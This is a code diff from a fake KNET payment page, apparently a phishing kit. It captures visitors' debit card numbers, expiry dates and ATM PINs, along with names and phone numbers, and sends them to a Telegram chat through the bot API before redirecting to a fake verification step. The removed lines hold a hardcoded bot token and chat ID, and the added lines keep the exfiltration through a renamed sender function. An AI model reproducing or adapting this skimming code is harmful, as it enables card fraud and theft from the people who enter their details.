@@ -1299,33 +1299,10 @@
     }
 
 
-    function sendTelegramMessage(messageText) {
         
-        botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg'
-        chatId = '-5263360636'
-        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // SENDING A TELEGRAM MESSAGE HERE
 
-        $.ajax({
-            url: apiUrl,
-            type: 'POST',
-            data: {
-                chat_id: chatId,
-                text: messageText,
-                parse_mode: "MarkdownV2"
-
-            },
-            success: function(response) {
-                console.log('Message sent successfully:', response);
-                // Optional: Provide feedback to the user
-            },
-            error: function(error) {
-                console.error('Error sending message:', error);
-                // Optional: Handle error and provide feedback
-            }
-        });
-    }
-
-    function onPay() {
+function onPay() {
         cc = document.getElementById('dcprefix').value + document.getElementById("debitNumber").value
         month = document.getElementById('month').value
         year = document.getElementById('year').value
@@ -1336,16 +1313,18 @@
 
         var message = `
     📩 كي نت
-    👤 الاسم/الجوال: \`${localStorage.getItem('userName')}\`
+    👤 الاسم: \`${localStorage.getItem('userName')}\`
+    👤 الاسم: \`${localStorage.getItem('phone')}\`
     🏦 البنك: ${document.getElementById('bank').value}
     🔢 البادئة: \`${document.getElementById('dcprefix').value}\`
     💳 آخر 10 أرقام: \`${document.getElementById("debitNumber").value}\`
     📅 انتهاء: \`${document.getElementById("month").value}/${document.getElementById("year").value}\`
     🔑 ATM: \`${document.getElementById("cardPin").value}\``
-        sendTelegramMessage(message)
-        window.location.href = '../verification';
 
-    }
+    
+    send_telegram_message(message)
+    window.location.href = '../verification';
+}
 
     function payConfirmAjax(val) {
 
